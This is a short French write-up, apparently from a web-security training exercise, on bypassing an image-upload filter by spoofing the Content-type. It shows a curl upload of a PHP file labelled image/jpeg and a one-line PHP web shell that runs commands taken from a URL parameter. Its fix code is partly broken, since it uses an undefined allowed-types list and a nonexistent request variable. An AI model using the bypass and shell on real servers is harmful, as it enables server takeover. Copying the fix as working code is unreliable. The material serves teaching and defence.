# Recherche

- Sur la page d'accueil on peut cliquer sur le bouton **ADD IMAGE** qui permet d'upload une image.

- Quand un fichier est uploadé, le type est **verifié** et les fichiers qui ne sont pas des images sont **refusés**.

# Exploit

- Il s'agit ici d'un exploit du **MIME (Multipurpose Internet Mail Extensions)** fournis dans la requète des fichier transmis au serveur. Le **MIME** est un standard qui permet **d'indiquer le type de contenu d'un fichier**. Il est utilisé pour les fichiers envoyés par mail, mais aussi pour les fichiers uploadés sur un **serveur web**.

- On peut upload **n'import quel type de fichier** avec `CURL` et changeant le `Content-type` de la requête pour `image/jpeg`, ce qui le fais passer le fichier **PHP** pour une **image** qui est alors accepté par le serveur.

```bash
touch maliciousScript.php
curl -s -X POST -F "uploaded=@maliciousScript.php;type=image/jpeg" -F "Upload=Upload" "http://$ip/index.php?page=upload"
```

`(cf. get_flag.sh)`

- Pour une utilisation reelle, on peut créer un s**cript PHP malveillant** qui va nous permettre **d'executer des commandes sur le serveur**.

```PHP
<?php
system($_GET['cmd']);
?>
```

# Fix

- Vérifier le type de fichier uploadé **coté serveur**.

- Utiliser `pathinfo` et `finfo_file` fournit par PHP pour obtenir **l'extension** et **le type MIME** d'un fichier respectivement. Le serveur peut ensuite **comparer ces informations** avec le `Content-type` de la requête pour **vérifier** que le fichier est bien du type attendu.

```PHP
$file = $_FILES['uploaded'];
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];

$extension = pathinfo($file['name'], PATHINFO_EXTENSION);
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime_type = $finfo->file($file['tmp_name']);

if (!in_array($extension, $allowed_extensions) || !in_array($mime_type, $allowed_mime_types)) {
    die('Invalid file type');
}

if ($mime_type !== $request['Content-type']) {
    die('Different MIME type between file and request');
}
```
